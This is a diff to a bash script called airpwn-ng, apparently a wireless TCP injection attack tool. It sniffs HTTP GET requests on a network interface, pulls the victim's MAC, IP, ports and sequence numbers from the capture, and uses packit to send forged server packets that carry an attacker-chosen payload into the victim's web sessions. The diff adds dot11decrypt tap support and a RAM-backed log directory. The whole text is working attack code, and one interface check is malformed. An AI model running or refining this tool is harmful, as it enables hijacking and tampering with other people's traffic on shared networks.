@@ -75,30 +75,43 @@
 ##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repetitious Functions ~~~~~~~~~~~~~~~~~~~~~~~##
 monitor--()
 {
-	
-## src MAC -- Victim
-nice -n -20 vicmac=$(awk -v i0="$i0" '{print $i0}' LOG | cut -d: -f 2-)
-
-## src MAC -- Router LAN MAC
-nice -n -20 rtrmac=$(awk -v i1="$i1" '{print $i1}' LOG | cut -d: -f 2-)
-
-## src IP -- Victim
-nice -n -20 vicip=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f -4)
-
-## src port -- Victim
-nice -n -20 vicport=$(awk -v i2="$i2" '{print $i2}' LOG | cut -d. -f 5-)
-
-## dst IP -- Server
-nice -n -20 svrip=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f -4)
-
-## svr port -- Server
-nice -n -20 svrport=$(awk -v i3="$i3" '{print $i3}' LOG | cut -d. -f 5- | sed 's/://')
-
-## sequence number + length
-nice -n -20 acknum=$(awk -v i4="$i4" '{print $i4}' LOG | cut -d: -f2 | sed 's/,//')
-
-## old acknowledgement number
-nice -n -20 seqnum=$(awk -v i5="$i5" '{print $i5}' LOG | sed 's/,//')
+LOGFILE=$2
+if [[ $1 == *"tap"* ]] #TAP INTERFACE ASSUMES DOT11DECRYPT IS IN USE AND USES HARDCODED VAR PARSING
+then
+	## src MAC -- Victim
+	vicmac=$(awk '{print $1}' $LOGFILE | cut -d: -f 1-)
+	## src MAC -- Router LAN MAC
+	rtrmac=$(awk '{print $3}' $LOGFILE | cut -d: -f 1- | tr -d ',')
+	## src IP -- Victim
+	vicip=$(awk '{print $9}' $LOGFILE | cut -d. -f -4)
+	## src port -- Victim
+	vicport=$(awk '{print $9}' $LOGFILE | cut -d. -f 5-)
+	## dst IP -- Server
+	svrip=$(awk '{print $11}' $LOGFILE | cut -d. -f -4)
+	## svr port -- Server
+	svrport=$(awk '{print $11}' $LOGFILE | cut -d. -f 5- | tr -d ':')
+	## sequence number + length
+	acknum=$(awk '{print $15}' $LOGFILE | cut -d: -f2 | sed 's/,//')
+	## old acknowledgement number
+	seqnum=$(awk '{print $17}' $LOGFILE | sed 's/,//')
+else
+	## src MAC -- Victim
+	vicmac=$(awk -v i0="$i0" '{print $i0}' $LOGFILE | cut -d: -f 2-)
+	## src MAC -- Router LAN MAC
+	rtrmac=$(awk -v i1="$i1" '{print $i1}' $LOGFILE | cut -d: -f 2-)
+	## src IP -- Victim
+	vicip=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f -4)
+	## src port -- Victim
+	vicport=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f 5-)
+	## dst IP -- Server
+	svrip=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f -4)
+	## svr port -- Server
+	svrport=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f 5- | sed 's/://')
+	## sequence number + length
+	acknum=$(awk -v i4="$i4" '{print $i4}' $LOGFILE | cut -d: -f2 | sed 's/,//')
+	## old acknowledgement number
+	seqnum=$(awk -v i5="$i5" '{print $i5}' $LOGFILE | sed 's/,//')
+fi
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -119,10 +132,50 @@ if [[ "$UID" -ne 0 ]];then
         exit 1
 fi
 
-if [[ -z $1  || -z $2 || -z $3 || -z $4 ]]; then
-	echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
-	exit 1
+if [[ -z $1  || -z $2 || -z $3 ]]; then
+	if [ -z $2 ]; then
+		echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
+		echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
+		exit 1	
+	else
+		if [ $2 -ne *"tap"* ]; then
+			if [ -z $4 ]; then
+				echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
+				echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
+				exit 1
+			fi
+		else
+			echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
+			exit 1
+		fi
+	fi
 fi
+
+## Make RAMFS for faster processing
+LOGFILE=/tmp/airpwn_ram/LOG
+DIR_EXISTS=$(ls -l /tmp/airpwn_ram | wc -l)
+if [ $DIR_EXISTS -gt 0 ]
+then
+TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
+if [ $TMPFS_MOUNTED -eq 1 ]
+then
+	echo "[*] RAMFS Mounted"
+else
+	mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
+	echo "[*] RAMFS Mounted"
+	fi
+else
+mkdir /tmp/airpwn_ram
+TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
+if [ $TMPFS_MOUNTED -eq 1 ]
+then
+	echo "[*] RAMFS Mounted"
+else
+	mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
+	echo "[*] RAMFS Mounted"
+	fi
+fi
+
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -135,15 +188,15 @@ i2=$(expr $index + 20)
 i3=$(expr $index + 22)
 i4=$(expr $index + 26)
 i5=$(expr $index + 28)
-
 ## Prepare the hex inject string
 inject=$(echo "0x$(cat $1 | xxd -g1 -ps | fold -w2 | paste -sd ' ')")
+
 while true; do
-	nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>LOG &
-	nice -n -20 inotifywait -r -e modify ./LOG
-	monitor--
+	nice -n 20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
+	nice -n 20 inotifywait -r -e modify $LOGFILE
+	monitor-- $2 $LOGFILE
 	
 	## inject the packet
-	nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
+	nice -n 20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
 done
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
